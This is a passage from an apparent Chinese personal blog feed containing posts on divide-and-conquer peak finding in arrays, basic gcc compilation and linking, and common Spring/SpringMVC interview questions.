<p>方案1.2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">FIND_PEAK(A)</div><div class="line">    n=A.length</div><div class="line">    if A[n/2]&gt;=A[n/2-1] and A[n/2]&gt;=A[n/2+1]</div><div class="line">        return n/2</div><div class="line">    else if A[n/2]&lt;A[n/2-1]</div><div class="line">        return FIND_PEAK(A[1..n/2-1])</div><div class="line">    else</div><div class="line">        return FIND_PEAK(A[n/2+1..n])</div></pre></td></tr></table></figure></p>
<p>这也就是说，取中间的元素，如果它本身就是峰，就结束；否则哪边的元素比中间大哪半边就必然有峰（用证明1的方法可得到验证）。如此递归，最坏复杂度降为(log n)。</p>
<h5 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h5><p>二维数组的峰值是这样的：</p>
<p><img src="./images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E6%B3%95-02.png" alt="二维数组" title="计算机算法-分治法-02"></p>
<p>先铺垫一下，再看「峰」的本质：由定义易知这里的峰和函数中的峰，或极值是相似的。即最值一定是极值，而极值不一定是最值。</p>
<p><strong>方案1</strong>：当然，我们的基本思路是将二元寻峰问题化归为一元寻峰问题。考虑寻找每一列的峰值。</p>
<p><img src="./images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E6%B3%95-03.png" alt="方案一" title="计算机算法-分治法-03"></p>
<p>如这张图所示，我们用橙色标记出了由优化后的寻找一维数组的峰值得到的每列一个峰值。然而下一步好像却没有什么好的方法继续寻找全局峰值。</p>
<p>红色标记展示了一种失败的方法，即在纵向寻峰的基础上再在该行横向寻峰，得到6。它显然不符合峰的定义。</p>
<p>注意到无论如何在一行或一列中寻找局部峰值，我们总无法保证它不小于相邻行列的数，我们就不得不在某些步骤上诉诸先前所讨论的最值了。</p>
<p><strong>方案二：找到全局最大值。</strong></p>
<p>由于数组是无序的，这种方案的复杂度只能是(m*n)，这不是我们希望看到的。</p>
<p>自然地，优化的方法仍然是分治法。我们的目标是找到一个必定存在全局峰值的子数组。</p>
<p>我们依旧从中间一列下手。然而我们这次寻找的是这一列的最大值，而非一个峰。仍然以上张图为例，我们找到的还是5。由于右边的6&gt;5，我们将范围缩小到右半边。然后递归处理。</p>
<p>相比刚才的失败方法，区别在于找到5后我们不再把范围限定在这一行，而是整个右半边。</p>
<p>去掉无关的数据，得到下图：</p>
<p><img src="./images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E6%B3%95-04.png" alt="方案二" title="计算机算法-分治法-04"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">FIND_PEAK_2(A)</div><div class="line">    A[n/2][i] is max(A[n/2])</div><div class="line">    if A[n/2][i]&gt;=A[n/2-1][i] and A[n/2][i]&gt;=A[n/2+1][i]</div><div class="line">        return (n/2,i)</div><div class="line">    else if A[n/2][i]&lt;A[n/2-1][i]</div><div class="line">        return FIND_PEAK_2(A)[1..n/2-1]</div><div class="line">    else</div><div class="line">        return FIND_PEAK_2(A)[n/2+1..n]</div></pre></td></tr></table></figure>
<p>这种方案的最坏复杂度是(m*logn)。当然，根据(m,n)的大小，在实际操作时我们可以灵活选择从行或列着手。</p>
<p><a href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-006-introduction-to-algorithms-fall-2011/" target="_blank" rel="external">MIT公开课</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;h3 id=&quot;一些案例&quot;&gt;&lt;a href=&quot;#一些案例&quot; class=&quot;headerlink&quot; title=&quot;一些案例&quot;&gt;&lt;/a&gt;一些案例&lt;/h
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>工具|gcc的一些坑</title>
    <link href="http://yoursite.com/2018/03/16/%E5%B7%A5%E5%85%B7-gcc%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://yoursite.com/2018/03/16/工具-gcc的一些坑/</id>
    <published>2018-03-15T23:44:27.000Z</published>
    <updated>2018-03-15T16:00:13.080Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>GCC 的意思也只是 GNU C Compiler 而已。经过了这么多年的发展，GCC 已经不仅仅能支持 C 语言；它现在还支持 Ada 语言、C++ 语言、Java 语言、Objective C 语言、Pascal 语言、COBOL语言，以及支持函数式编程和逻辑编程的 Mercury 语言，等等。而 GCC 也不再单只是 GNU C 语言编译器的意思了，而是变成了 GNU Compiler Collection 也即是 GNU 编译器家族的意思了。另一方面，说到 GCC 对于操作系统平台及硬件平台支持，概括起来就是一句话：无所不在</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use?"></a>How to use?</h3><p>gcc说到底也就是一个工具，知道怎么用才是硬功夫。</p>
<h4 id="简单编译"><a href="#简单编译" class="headerlink" title="简单编译"></a>简单编译</h4><p>示例程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//test.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    printf(&quot;Hello World!\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个程序，一步到位的编译指令是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.c -o test</div></pre></td></tr></table></figure></p>
<p>实质上，上述编译过程是分为四个阶段进行的，即预处理(也称预编译，Preprocessing)、编译(Compilation)、汇编 (Assembly)和连接(Linking)。</p>
<h5 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -E test.c -o test.i 或 gcc -E test.c</div></pre></td></tr></table></figure>
<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。后面那条指令，是直接在命令行窗口中输出预处理后的代码.</p>
<p>gcc的-E选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将stdio.h 文件中的内容插入到test.c中了。</p>
<h5 id="编译为汇编代码-Compilation"><a href="#编译为汇编代码-Compilation" class="headerlink" title="编译为汇编代码(Compilation)"></a>编译为汇编代码(Compilation)</h5><p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -S test.i -o test.s</div></pre></td></tr></table></figure></p>
<p>gcc的-S选项，表示在程序编译期间，在生成汇编代码后，停止，-o输出汇编代码文件。</p>
<h5 id="汇编-Assembly"><a href="#汇编-Assembly" class="headerlink" title="汇编(Assembly)"></a>汇编(Assembly)</h5><p>对于上一小节中生成的汇编代码文件test.s，gas汇编器负责将其编译为目标文件，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -c test.s -o test.o</div></pre></td></tr></table></figure></p>
<h5 id="连接-Linking"><a href="#连接-Linking" class="headerlink" title="连接(Linking)"></a>连接(Linking)</h5><p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。</p>
<p>对于上一小节中生成的test.o，将其与Ｃ标准输入输出库进行连接，最终生成程序test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.o -o test</div></pre></td></tr></table></figure></p>
<p>最后，在命令行窗口中，执行./test, 让它说HelloWorld吧！</p>
<h4 id="多个程序文件的编译"><a href="#多个程序文件的编译" class="headerlink" title="多个程序文件的编译"></a>多个程序文件的编译</h4><p>通常整个程序是由多个源文件组成的，相应地也就形成了多个编译单元，使用GCC能够很好地管理这些编译单元。假设有一个由test1.c和 test2.c两个源文件组成的程序，为了对它们进行编译，并最终生成可执行程序test，可以使用下面这条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test1.c test2.c -o test</div></pre></td></tr></table></figure></p>
<p>如果同时处理的文件不止一个，GCC仍然会按照预处理、编译和链接的过程依次进行。如果深究起来，上面这条命令大致相当于依次执行如下三条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc -c test1.c -o test1.o</div><div class="line">gcc -c test2.c -o test2.o</div><div class="line">gcc test1.o test2.o -o test</div></pre></td></tr></table></figure></p>
<h4 id="检错"><a href="#检错" class="headerlink" title="检错"></a>检错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -pedantic illcode.c -o illcode</div></pre></td></tr></table></figure>
<p><strong>-pedantic</strong>编译选项并不能保证被编译程序与ANSI/ISO C标准的完全兼容，它仅仅只能用来帮助Linux程序员离这个目标越来越近。或者换句话说，<strong>-pedantic</strong>选项能够帮助程序员发现一些不符合 ANSI/ISO C标准的代码，但不是全部，事实上只有ANSI/ISO C语言标准中要求进行编译器诊断的那些情况，才有可能被GCC发现并提出警告。</p>
<p>除了-pedantic之外，GCC还有一些其它编译选项也能够产生有用的警告信息。这些选项大多以-W开头，其中最有价值的当数-Wall了，使用它能够使GCC产生尽可能多的警告信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Wall illcode.c -o illcode</div></pre></td></tr></table></figure></p>
<p>GCC给出的警告信息虽然从严格意义上说不能算作错误，但却很可能成为错误的栖身之所。一个优秀的Linux程序员应该尽量避免产生警告信息，使自己的代码始终保持标准、健壮的特性。所以将警告信息当成编码错误来对待，是一种值得赞扬的行为！所以，在编译程序时带上-Werror选项，那么GCC会在所有产生警告的地方停止编译，迫使程序员对自己的代码进行修改，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Werror test.c -o test</div></pre></td></tr></table></figure></p>
<h4 id="库文件连接"><a href="#库文件连接" class="headerlink" title="库文件连接"></a>库文件连接</h4><p>开发软件时，完全不使用第三方函数库的情况是比较少见的，通常来讲都需要借助许多函数库的支持才能够完成相应的功能。从程序员的角度看，函数库实际上就是一些头文件（.h）和库文件（so、或lib、dll）的集合。。虽然Linux下的大多数函数都默认将头文件放到/usr/include/目录下，而库文件则放到/usr/lib/目录下；Windows所使用的库文件主要放在Visual Stido的目录下的include和lib，以及系统文件夹下。但也有的时候，我们要用的库不再这些目录下，所以GCC在编译时必须用自己的办法来查找所需要的头文件和库文件。</p>
<p>例如我们的程序test.c是在linux上使用c连接mysql，这个时候我们需要去mysql官网下载MySQL Connectors的C库，下载下来解压之后，有一个include文件夹，里面包含mysql connectors的头文件，还有一个lib文件夹，里面包含二进制so文件libmysqlclient.so</p>
<p>其中inclulde文件夹的路径是/usr/dev/mysql/include,lib文件夹是/usr/dev/mysql/lib</p>
<h5 id="编译成可执行文件"><a href="#编译成可执行文件" class="headerlink" title="编译成可执行文件"></a>编译成可执行文件</h5><p>首先我们要进行编译test.c为目标文件，这个时候需要执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc –c –I /usr/dev/mysql/include test.c –o test.o</div></pre></td></tr></table></figure></p>
<h5 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h5><p>最后我们把所有目标文件链接成可执行文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc –L /usr/dev/mysql/lib –lmysqlclient test.o –o test</div></pre></td></tr></table></figure></p>
<p>Linux下的库文件分为两大类分别是动态链接库（通常以.so结尾）和静态链接库（通常以.a结尾），二者的区别仅在于程序执行时所需的代码是在运行时动态加载的，还是在编译时静态加载的。</p>
<h5 id="强制链接时使用静态链接库"><a href="#强制链接时使用静态链接库" class="headerlink" title="强制链接时使用静态链接库"></a>强制链接时使用静态链接库</h5><p>默认情况下， GCC在链接时优先使用动态链接库，只有当动态链接库不存在时才考虑使用静态链接库，如果需要的话可以在编译时加上-static选项，强制使用静态链接库。</p>
<p>在/usr/dev/mysql/lib目录下有链接时所需要的库文件libmysqlclient.so和libmysqlclient.a，为了让GCC在链接时只用到静态链接库，可以使用下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc –L /usr/dev/mysql/lib –static –lmysqlclient test.o –o test</div></pre></td></tr></table></figure></p>
<p>静态库链接时搜索路径顺序：</p>
<ol>
<li>ld会去找GCC命令中的参数-L</li>
<li>再找gcc的环境变量LIBRARY_PATH</li>
<li>再找内定目录 /lib /usr/lib /usr/local/lib 这是当初compile gcc时写在程序内的</li>
</ol>
<p>动态链接时、执行时搜索路径顺序:</p>
<ol>
<li>编译目标代码时指定的动态库搜索路径</li>
<li>环境变量LD_LIBRARY_PATH指定的动态库搜索路径</li>
<li>配置文件/etc/ld.so.conf中指定的动态库搜索路径</li>
<li>默认的动态库搜索路径/lib</li>
<li>默认的动态库搜索路径/usr/lib</li>
</ol>
<p>有关环境变量：<br>LIBRARY_PATH环境变量：指定程序静态链接库文件搜索路径<br>LD_LIBRARY_PATH环境变量：指定程序动态链接库文件搜索路径</p>
<p><a href="http://www.cnblogs.com/ggjucheng/archive/2011/12/14/2287738.html" target="_blank" rel="external">gcc常用操作</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;GCC 的意思也只是 GNU C Compiler 而已。经过了这么多年的发展，GCC 已经不仅仅能支持 C 语言；它现在还支持 Ada 语
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>面试|SpringMVC常见面试题</title>
    <link href="http://yoursite.com/2018/03/15/%E9%9D%A2%E8%AF%95-SpringMVC%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://yoursite.com/2018/03/15/面试-SpringMVC常见面试题/</id>
    <published>2018-03-14T19:15:46.000Z</published>
    <updated>2018-03-15T15:56:49.562Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><h4 id="什么是Spring框架？Spring框架有哪些主要模块？"><a href="#什么是Spring框架？Spring框架有哪些主要模块？" class="headerlink" title="什么是Spring框架？Spring框架有哪些主要模块？"></a>什么是Spring框架？Spring框架有哪些主要模块？</h4><p>Spring框架是一个为Java应用程序的开发提供了综合、广泛的基础性支持的Java平台。Spring帮助开发者解决了开发中基础性的问题，使得开发人员可以专注于应用程序的开发。Spring框架本身亦是按照设计模式精心打造，这使得我们可以在开发环境中安心的集成Spring框架，不必担心Spring是如何在后台进行工作的。</p>
<p>Spring框架至今已集成了20多个模块。这些模块主要被分如下图所示的核心容器、数据访问/集成,、Web、AOP（面向切面编程）、工具、消息和测试模块。</p>
<p><img src="/images/面试--Spring-01.png" alt="Spring模块" title="面试--Spring-01"></p>
<h4 id="使用Spring框架能带来哪些好处？"><a href="#使用Spring框架能带来哪些好处？" class="headerlink" title="使用Spring框架能带来哪些好处？"></a>使用Spring框架能带来哪些好处？</h4><p>下面列举了一些使用Spring框架带来的主要好处：</p>
<ul>
<li>Dependency Injection(DI) 方法使得构造器和JavaBean properties文件中的依赖关系一目了然。</li>
<li>与EJB容器相比较，IoC容器更加趋向于轻量级。这样一来IoC容器在有限的内存和CPU资源的情况下进行应用程序的开发和发布就变得十分有利。</li>
<li>Spring并没有闭门造车，Spring利用了已有的技术比如ORM框架、logging框架、J2EE、Quartz和JDK Timer，以及其他视图技术。</li>
<li>Spring框架是按照模块的形式来组织的。由包和类的编号就可以看出其所属的模块，开发者仅仅需要选用他们需要的模块即可。</li>
<li>要测试一项用Spring开发的应用程序十分简单，因为测试相关的环境代码都已经囊括在框架中了。更加简单的是，利用JavaBean形式的POJO类，可以很方便的利用依赖注入来写入测试数据。</li>
<li>Spring的Web框架亦是一个精心设计的Web MVC框架，为开发者们在web框架的选择上提供了一个除了主流框架比如Struts、过度设计的、不流行web框架的以外的有力选项。</li>
<li>Spring提供了一个便捷的事务管理接口，适用于小型的本地事物处理（比如在单DB的环境下）和复杂的共同事物处理（比如利用JTA的复杂DB环境）。</li>
</ul>
<h4 id="什么是控制反转-IOC-？什么是依赖注入？"><a href="#什么是控制反转-IOC-？什么是依赖注入？" class="headerlink" title="什么是控制反转(IOC)？什么是依赖注入？"></a>什么是控制反转(IOC)？什么是依赖注入？</h4><p>控制反转是应用于软件工程领域中的，在运行时被装配器对象来绑定耦合对象的一种编程技巧，对象之间耦合关系在编译时通常是未知的。在传统的编程方式中，业务逻辑的流程是由应用程序中的早已被设定好关联关系的对象来决定的。在使用控制反转的情况下，业务逻辑的流程是由对象关系图来决定的，该对象关系图由装配器负责实例化，这种实现方式还可以将对象之间的关联关系的定义抽象化。而绑定的过程是通过“依赖注入”实现的。</p>
<p>控制反转是一种以给予应用程序中目标组件更多控制为目的设计范式，并在我们的实际工作中起到了有效的作用。</p>
<p>依赖注入是在编译阶段尚未知所需的功能是来自哪个的类的情况下，将其他对象所依赖的功能对象实例化的模式。这就需要一种机制用来激活相应的组件以提供特定的功能，所以依赖注入是控制反转的基础。否则如果在组件不受框架控制的情况下，框架又怎么知道要创建哪个组件？</p>
<p>在Java中依然注入有以下三种实现方式：</p>
<ol>
<li>构造器注入</li>
<li>Setter方法注入</li>
<li>接口注入</li>
</ol>
<h4 id="请解释下Spring框架中的IoC？"><a href="#请解释下Spring框架中的IoC？" class="headerlink" title="请解释下Spring框架中的IoC？"></a>请解释下Spring框架中的IoC？</h4><p>Spring中的 org.springframework.beans 包和 org.springframework.context包构成了Spring框架IoC容器的基础。</p>
<p>BeanFactory 接口提供了一个先进的配置机制，使得任何类型的对象的配置成为可能。ApplicationContex接口对BeanFactory（是一个子接口）进行了扩展，在BeanFactory的基础上添加了其他功能，比如与Spring的AOP更容易集成，也提供了处理message resource的机制（用于国际化）、事件传播以及应用层的特别配置，比如针对Web应用的WebApplicationContext。</p>
<p>org.springframework.beans.factory.BeanFactory 是Spring IoC容器的具体实现，用来包装和管理前面提到的各种bean。BeanFactory接口是Spring IoC 容器的核心接口。</p>
<h4 id="谈谈你对spring-IOC和DI的理解，它们有什么区别？"><a href="#谈谈你对spring-IOC和DI的理解，它们有什么区别？" class="headerlink" title="谈谈你对spring IOC和DI的理解，它们有什么区别？"></a>谈谈你对spring IOC和DI的理解，它们有什么区别？</h4><p>IoC Inverse of Control 反转控制的概念，就是将原本在程序中手动创建UserService对象的控制权，交由Spring框架管理，简单说，就是创建UserService对象控制权被反转到了Spring框架</p>
<p>DI：Dependency Injection 依赖注入，在Spring框架负责创建Bean对象时，动态的将依赖对象注入到Bean组件</p>
<p><img src="/images/面试--Spring-03.jpg" alt="Spring-Ioc" title="面试--Spring-03"></p>
<p><strong>[IoC 控制反转，指将对象的创建权，反转到Spring容器 ， DI 依赖注入，指Spring创建对象的过程中，将对象依赖属性通过配置进行注入]</strong></p>
<h4 id="BeanFactory和ApplicationContext有什么区别？"><a href="#BeanFactory和ApplicationContext有什么区别？" class="headerlink" title="BeanFactory和ApplicationContext有什么区别？"></a>BeanFactory和ApplicationContext有什么区别？</h4><p>BeanFactory 可以理解为含有bean集合的工厂类。BeanFactory 包含了种bean的定义，以便在接收到客户端请求时将对应的bean实例化。</p>
<p>BeanFactory还能在实例化对象的时生成协作类之间的关系。此举将bean自身与bean客户端的配置中解放出来。BeanFactory还包含了bean生命周期的控制，调用客户端的初始化方法（initialization methods）和销毁方法（destruction methods）。</p>
<p>从表面上看，application context如同bean factory一样具有bean定义、bean关联关系的设置，根据请求分发bean的功能。但application context在此基础上还提供了其他的功能。</p>
<ul>
<li>提供了支持国际化的文本消息</li>
<li>统一的资源文件读取方式</li>
<li>已在监听器中注册的bean的事件</li>
</ul>
<p>以下是三种较常见的 ApplicationContext 实现方式：</p>
<p>1、ClassPathXmlApplicationContext：从classpath的XML配置文件中读取上下文，并生成上下文定义。应用程序上下文从程序环境变量中取得。</p>
<blockquote>
<p>ApplicationContext context = new ClassPathXmlApplicationContext(“bean.xml”);</p>
</blockquote>
<p>2、FileSystemXmlApplicationContext ：由文件系统中的XML配置文件读取上下文。</p>
<blockquote>
<p>ApplicationContext context = new FileSystemXmlApplicationContext(“bean.xml”);</p>
</blockquote>
<p>3、XmlWebApplicationContext：由Web应用的XML文件读取上下文。</p>
<p>6、Spring有几种配置方式？<br>将Spring配置到应用开发中有以下三种方式：</p>
<p>基于XML的配置<br>基于注解的配置<br>基于Java的配置</p>
<h4 id="如何用基于XML配置的方式配置Spring？"><a href="#如何用基于XML配置的方式配置Spring？" class="headerlink" title="如何用基于XML配置的方式配置Spring？"></a>如何用基于XML配置的方式配置Spring？</h4><p>在Spring框架中，依赖和服务需要在专门的配置文件来实现，我常用的XML格式的配置文件。这些配置文件的格式通常用<beans>开头，然后一系列的bean定义和专门的应用配置选项组成。</beans></p>
<p>SpringXML配置的主要目的时候是使所有的Spring组件都可以用xml文件的形式来进行配置。这意味着不会出现其他的Spring配置类型（比如声明的方式或基于Java Class的配置方式）</p>
<p>Spring的XML配置方式是使用被Spring命名空间的所支持的一系列的XML标签来实现的。Spring有以下主要的命名空间：context、beans、jdbc、tx、aop、mvc和aso。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;beans&gt;</div><div class="line"> </div><div class="line">    &lt;!-- JSON Support --&gt;</div><div class="line">    &lt;bean name=&quot;viewResolver&quot; class=&quot;org.springframework.web.servlet.view.BeanNameViewResolver&quot;/&gt;</div><div class="line">    &lt;bean name=&quot;jsonTemplate&quot; class=&quot;org.springframework.web.servlet.view.json.MappingJackson2JsonView&quot;/&gt;</div><div class="line"> </div><div class="line">    &lt;bean id=&quot;restTemplate&quot; class=&quot;org.springframework.web.client.RestTemplate&quot;/&gt;</div><div class="line"> </div><div class="line">&lt;/beans&gt;</div></pre></td></tr></table></figure>
<p>下面这个web.xml仅仅配置了DispatcherServlet，这件最简单的配置便能满足应用程序配置运行时组件的需求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;web-app&gt;</div><div class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</div><div class="line"> </div><div class="line">  &lt;servlet&gt;</div><div class="line">        &lt;servlet-name&gt;spring&lt;/servlet-name&gt;</div><div class="line">            &lt;servlet-class&gt;</div><div class="line">                org.springframework.web.servlet.DispatcherServlet</div><div class="line">            &lt;/servlet-class&gt;</div><div class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</div><div class="line">    &lt;/servlet&gt;</div><div class="line"> </div><div class="line">    &lt;servlet-mapping&gt;</div><div class="line">        &lt;servlet-name&gt;spring&lt;/servlet-name&gt;</div><div class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</div><div class="line">    &lt;/servlet-mapping&gt;</div><div class="line"> </div><div class="line">&lt;/web-app&gt;</div></pre></td></tr></table></figure></p>
<h4 id="请解释Spring-Bean的生命周期？"><a href="#请解释Spring-Bean的生命周期？" class="headerlink" title="请解释Spring Bean的生命周期？"></a>请解释Spring Bean的生命周期？</h4><p>Spring Bean的生命周期简单易懂。在一个bean实例被初始化时，需要执行一系列的初始化操作以达到可用的状态。同样的，当一个bean不在被调用时需要进行相关的析构操作，并从bean容器中移除。</p>
<p>Spring bean factory 负责管理在spring容器中被创建的bean的生命周期。Bean的生命周期由两组回调（call back）方法组成。</p>
<ol>
<li>初始化之后调用的回调方法。</li>
<li>销毁之前调用的回调方法。</li>
</ol>
<p>Spring框架提供了以下四种方式来管理bean的生命周期事件：</p>
<ul>
<li>InitializingBean和DisposableBean回调接口</li>
<li>针对特殊行为的其他Aware接口</li>
<li>Bean配置文件中的Custom init()方法和destroy()方法</li>
<li>@PostConstruct和@PreDestroy注解方式</li>
</ul>
<p>使用customInit()和 customDestroy()方法管理bean生命周期的代码样例如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;beans&gt;</div><div class="line">    &lt;bean id=&quot;demoBean&quot; class=&quot;com.howtodoinjava.task.DemoBean&quot;</div><div class="line">            init-method=&quot;customInit&quot; destroy-method=&quot;customDestroy&quot;&gt;&lt;/bean&gt;</div><div class="line">&lt;/beans&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Bean注入属性有哪几种方式？"><a href="#Bean注入属性有哪几种方式？" class="headerlink" title="Bean注入属性有哪几种方式？"></a>Bean注入属性有哪几种方式？</h4><p><img src="/images/面试--Spring-04.jpg" alt="Bean注入方式" title="面试--Spring-04"></p>
<h4 id="什么是AOP，AOP的作用是什么？"><a href="#什么是AOP，AOP的作用是什么？" class="headerlink" title="什么是AOP，AOP的作用是什么？"></a>什么是AOP，AOP的作用是什么？</h4><p>面向切面编程（AOP）提供另外一种角度来思考程序结构，通过这种方式弥补了面向对象编程（OOP）的不足，除了类（classes）以外，AOP提供了切面。切面对关注点进行模块化，例如横切多个类型和对象的事务管理。</p>
<p>Spring的一个关键的组件就是AOP框架，可以自由选择是否使用AOP 提供声明式企业服务，特别是为了替代EJB声明式服务。最重要的服务是声明性事务管理，这个服务建立在Spring的抽象事物管理之上。允许用户实现自定义切面，用AOP来完善OOP的使用,可以把Spring AOP看作是对Spring的一种增强。</p>
<p><img src="/images/面试--Spring-05.jpg" alt="Spring-AOP" title="面试--Spring-05"></p>
<h4 id="Spring的核心类有哪些，各有什么作用？"><a href="#Spring的核心类有哪些，各有什么作用？" class="headerlink" title="Spring的核心类有哪些，各有什么作用？"></a>Spring的核心类有哪些，各有什么作用？</h4><ul>
<li>BeanFactory：产生一个新的实例，可以实现单例模式</li>
<li>BeanWrapper：提供统一的get及set方法</li>
<li>ApplicationContext:提供框架的实现，包括BeanFactory的所有功能</li>
</ul>
<h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><h4 id="简单的谈一下SpringMVC的工作流程？"><a href="#简单的谈一下SpringMVC的工作流程？" class="headerlink" title="简单的谈一下SpringMVC的工作流程？"></a>简单的谈一下SpringMVC的工作流程？</h4><p><img src="/images/面试--Spring-02.jpg" alt="SpringMVC工作流程" title="面试--Spring-02"></p>
<ol>
<li>用户发送请求至前端控制器DispatcherServlet </li>
<li>DispatcherServlet收到请求调用HandlerMapping处理器映射器。 </li>
<li>处理器映射器找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet。 </li>
<li>DispatcherServlet调用HandlerAdapter处理器适配器 </li>
<li>HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)。 </li>
<li>Controller执行完成返回ModelAndView </li>
<li>HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet </li>
<li>DispatcherServlet将ModelAndView传给ViewReslover视图解析器 </li>
<li>ViewReslover解析后返回具体View </li>
<li>DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。 </li>
<li>DispatcherServlet响应用户</li>
</ol>
<p>总的来说，系统启动的时候根据配置文件创建spring的容器, 首先是发送http请求到核心控制器disPatherServlet，spring容器通过映射器去寻找业务控制器， 使用适配器找到相应的业务类，在进业务类时进行数据封装，在封装前可能会涉及到类型转换，执行完业务类后使用ModelAndView进行视图转发，数据放在model中，用map传递数据进行页面显示。</p>
